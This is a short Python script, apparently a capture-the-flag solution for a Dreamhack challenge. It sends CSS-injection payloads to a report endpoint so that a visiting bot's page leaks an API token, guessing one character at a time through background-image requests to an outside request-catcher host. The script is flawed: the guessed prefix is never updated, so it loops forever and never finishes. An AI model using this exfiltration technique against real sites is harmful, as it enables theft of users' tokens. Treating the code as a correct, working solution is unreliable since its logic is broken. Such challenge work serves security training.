import requests, string

url = "http://host3.dreamhack.games:11088/report"
alphabet = string.ascii_lowercase
flag = ""

while(1):
    for i in alphabet:
        data = {"path":"mypage?color=red;} input[id=InputApitoken][value^="+flag+i+"] {background: url(https://sbvmjfi.request.dreamhack.games?flag="+flag+i+");"}
        requests.post(url, data=data)
        print(i)

    if(len(flag) == 16):
        break
        
